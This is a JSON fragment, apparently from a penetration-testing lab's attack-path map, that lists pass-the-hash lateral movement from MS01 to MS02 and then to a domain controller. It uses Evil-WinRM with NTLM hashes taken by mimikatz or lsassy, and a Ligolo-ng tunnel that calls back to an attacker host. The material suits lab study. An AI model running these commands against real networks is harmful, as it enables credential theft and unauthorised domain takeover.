  "connections":[
    {
      "from":"ms01","to":"ms02",
      "technique":"Pass-the-Hash (Evil-WinRM)",
      "requires":"celia.almeda NTLM hash from lsassy/mimikatz on MS01",
      "pivot":"Ligolo-ng tunnel through MS01 to 10.10.x.0/24",
      "path_ids":["path-ad-main","path-ad-kerberoast"],
      "commands":[
        "ligolo-ng agent -connect 192.168.x.KALI:11601 -retry -ignore-cert",
        "session","ifconfig","start --tun ligolo",
        {"cmd": "ip route add 10.10.x.0/24 dev ligolo", "rationale": "Why: Route internal traffic through tunnel to reach AD hosts"},
        "evil-winrm -i 10.10.x.142 -u celia.almeda -H '<hash>'"
      ]
    },
    {
      "from":"ms02","to":"dc01",
      "technique":"Pass-the-Hash (Evil-WinRM)",
      "requires":"tom_admin hash from windows.old SAM dump OR DA hash from Mimikatz",
      "pivot":"Already on internal network via MS01 tunnel",
      "path_ids":["path-ad-main","path-ad-kerberoast"],
      "commands":[
        "evil-winrm -i 10.10.x.140 -u tom_admin -H '<hash>'",
        "evil-winrm -i 10.10.x.140 -u Administrator -H '<da_hash>'"
      ]
    }
  ],

